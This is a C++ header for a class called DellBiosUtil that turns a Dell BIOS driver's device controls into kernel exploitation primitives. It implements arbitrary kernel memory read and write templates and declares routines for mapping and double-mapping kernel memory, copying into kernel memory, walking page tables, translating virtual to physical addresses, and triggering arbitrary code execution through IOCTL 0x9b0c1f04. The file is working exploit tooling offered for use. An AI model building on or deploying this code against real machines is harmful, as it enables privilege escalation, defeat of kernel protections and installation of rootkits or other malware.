#pragma once
#include "base.h"
#include "typesndefs.h"

class DellBiosUtil : public base
{
private:
	PARBITRARY_READ_PRIMITIVE pReadPrimitive = nullptr;
	PARBITRARY_WRITE_PRIMITIVE pWritePrimitive = nullptr;
	PARBITRARY_KERNEL_MAPPING pKernelMapping = nullptr;
	PARBITRARY_DOUBLE_MAPPING pDoubleMapping = nullptr;
	PARBITRARY_KERNEL_MEMCPY pKernelMemcpy = nullptr;
	PFILL_PTE_HIERARCHY pPteHierarchy = nullptr;

public:
	/// <summary>
	/// Template to read either a byte, word, dword, or qword. 
	/// </summary>
	/// <typeparam name="T"></typeparam>
	/// <typeparam name="P"></typeparam>
	/// <param name="ReadWhat"></param>
	/// <param name="ReadValue"></param>
	/// <returns>true/false</returns>
	template <typename T, typename P>
	bool Read(
		_In_ T ReadWhat,
		_Outptr_result_maybenull_ P ReadValue
	)
	{
		pReadPrimitive = new ARBITRARY_READ_PRIMITIVE;

		RtlSecureZeroMemory(pReadPrimitive, sizeof(ARBITRARY_READ_PRIMITIVE));

		pReadPrimitive->AddressToRead = ReadWhat;
		pReadPrimitive->NumberOfBytes = 0x18 + sizeof(T);

		bool bStatus = sendDeviceIoControl(
			ARBITRARY_READ,
			pReadPrimitive,
			pReadPrimitive->NumberOfBytes,
			pReadPrimitive,
			pReadPrimitive->NumberOfBytes
		);
		if (!bStatus)
		{
			wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
			delete pReadPrimitive;
			return false;
		}

		RtlCopyMemory(ReadValue, pReadPrimitive->Data, sizeof(T));

		delete pReadPrimitive;
		return true;
	}

	/// <summary>
	/// A template to write either a byte, word, dword, or qword. 
	/// </summary>
	/// <typeparam name="T"></typeparam>
	/// <typeparam name="P"></typeparam>
	/// <param name="WriteWhat"></param>
	/// <param name="WriteWhere"></param>
	/// <returns></returns>
	template <typename T, typename P>
	bool Write(
		_In_ T WriteWhat,
		_In_ P WriteWhere
	)
	{
		pWritePrimitive = new ARBITRARY_WRITE_PRIMITIVE;

		RtlSecureZeroMemory(pWritePrimitive, sizeof(ARBITRARY_WRITE_PRIMITIVE));

		pWritePrimitive->WriteWhat = WriteWhat;
		pWritePrimitive->WriteWhere = WriteWhere;
		pWritePrimitive->NumberOfBytes = 0x18 + sizeof(T);

		bool bStatus = sendDeviceIoControl(
			ARBITRARY_WRITE,
			pWritePrimitive,
			pWritePrimitive->NumberOfBytes,
			pWritePrimitive,
			pWritePrimitive->NumberOfBytes
		);
		if (!bStatus)
		{
			wsprintf(e, L"[%ws::%d] %ws", __FUNCTIONW__, __LINE__, dellGle());
		}

		delete pWritePrimitive;
		return bStatus;
	}

	/// <summary>
	/// Uses IOCTL 0x9b0c1ec0 to map kernel memory using MmAllocateContiguousMemorySpecifyCache.
	/// The allocated memory is not zeroed. 
	/// </summary>
	/// <param name="NumberOfBytes"></param>
	/// <param name="Mapped"></param>
	/// <returns>Pointer to allocation</returns>
	bool MapKernelMemory(
		_In_ size_t NumberOfBytes,
		_Outptr_result_maybenull_ PUINT64 Mapped
	);

	/// <summary>
	/// Uses IOCTL 0x9b0c1f44 to double map read-only memory using MmMapIoSpace. 
	/// </summary>
	/// <param name="PhysicalAddress"></param>
	/// <param name="DataToCopy"></param>
	/// <param name="CopySize"></param>
	/// <returns>true/false</returns>
	bool DoubleMap(
		_In_ UINT64 PhysicalAddress,
		_In_reads_bytes_(CopySize) UINT8* DataToCopy,
		_In_ UINT32 CopySize
	);

	/// <summary>
	/// Copies x amount of data. The data buffer is only 1024, which is 
	/// more than enough for what should be needed. If not, change it. 
	/// </summary>
	/// <param name="CopyWhat"></param>
	/// <param name="CopyWhere"></param>
	/// <param name="CopySize"></param>
	/// <returns>true/false</returns>
	bool KernelMemcpy(
		_In_ UINT8* CopyWhat,
		_In_ UINT64 CopyWhere,
		_In_ UINT32 CopySize
	);

	/// <summary>
	/// Calculates the PML4 of a given virtual address. 
	/// </summary>
	/// <param name="VirtualAddress"></param>
	/// <param name="PteBase"></param>
	/// <returns>PFILL_PTE_HIERARCHY</returns>
	PFILL_PTE_HIERARCHY MiFillPteHierarchy(
		_In_ UINT64 VirtualAddress,
		_In_ UINT64 PteBase
	);

	/// <summary>
	/// Filthy way of checking if a PTE is valid. 
	/// </summary>
	/// <param name="Source"></param>
	/// <param name="Pte"></param>
	/// <returns>true/false</returns>
	bool isValidPte(
		_In_ UINT64 Source,
		_In_ UINT64 Pte
	);

	/// <summary>
	/// Converts a virtual address to a physical address. 
	/// </summary>
	/// <param name="VirtualAddress"></param>
	/// <param name="index"></param>
	/// <returns>UINT64</returns>
	UINT64 VirtualToPhysical(
		_In_ UINT64 VirtualAddress,
		_In_ UINT64 index
	);

	/// <summary>
	/// Trigger arbitrary code execution using IOCTL 0x9b0c1f04.
	/// </summary>
	void TriggerCodeExec();
};


/// EOF 